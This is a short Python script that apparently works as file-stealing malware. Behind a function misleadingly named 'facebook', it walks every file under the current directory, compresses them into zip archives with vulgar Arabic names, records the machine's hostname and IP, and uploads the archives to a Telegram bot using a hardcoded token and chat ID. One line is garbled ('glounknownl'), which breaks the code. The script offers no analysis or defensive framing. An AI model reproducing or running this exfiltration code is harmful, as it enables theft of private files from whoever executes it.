import os
import shutil
import requests
import socket
import pyminizip
from concurrent.futures import ThreadPoolExecutor

unknownTok = '6609311755:AAH-qZnEV64VZb1nUlsh23ztiR_5OVDRvJI'
unknownID = '6066525202'
unknown_file = []

def compress_files(args):
    files, output_zip, password = args
    pyminizip.compress_multiple(files, [], output_zip, None, 5)
    return output_zip

def unknown2(unknownZip):
    glounknownl unknown_file

    files = []
    for root, dirs, files_in_dir in os.walk("."):
        for file in files_in_dir:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.zip') and file_path not in unknown_file:
                files.append(file_path)
    num_workers = 4 
    chunk_size = max(3, len(files) // (num_workers * 2))
    chunks = [files[i:i + chunk_size] for i in range(0, len(files), chunk_size)]
    args = [(chunk, f"تم_النكح_{i}.zip", None) for i, chunk in enumerate(chunks)] 
    
    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        temp_zips = list(executor.map(compress_files, args))
    
    for temp_zip in temp_zips:
        unknown_file.append(temp_zip)
    for temp_zip in temp_zips:
        send_to_telegram(temp_zip)

def unknown4():
    unknownDv = socket.gethostname()
    unknownip = socket.gethostbyname(unknownDv)
    return unknownDv, unknownip

def unknown5(unknownPas, unknownDv, unknownip):
    message = f"esey fuck"
    url = f"https://api.telegram.org/bot{unknownTok}/sendMessage"
    data = {"chat_id": unknownID, "text": message}
    response = requests.post(url, data=data)

def unknown6(unknownZip):
    if os.path.exists(unknownZip):
        url = f"https://api.telegram.org/bot{unknownTok}/sendDocument"
        with open(unknownZip, "rb") as document:
            files = {"document": document}
            data = {"chat_id": unknownID}
            response = requests.post(url, files=files, data=data)
        os.remove(unknownZip)

def send_to_telegram(unknownZip):
    if os.path.exists(unknownZip):
        url = f"https://api.telegram.org/bot{unknownTok}/sendDocument"
        with open(unknownZip, "rb") as document:
            files = {"document": document}
            data = {"chat_id": unknownID}
            response = requests.post(url, files=files, data=data)

def facebook():
    unknownZip = "منكوح.zip"
    unknown2(unknownZip)
    unknownDv, unknownip = unknown4()
    unknown5("", unknownDv, unknownip)
    unknown6(unknownZip)

if __name__ == "__main__":
    facebook()
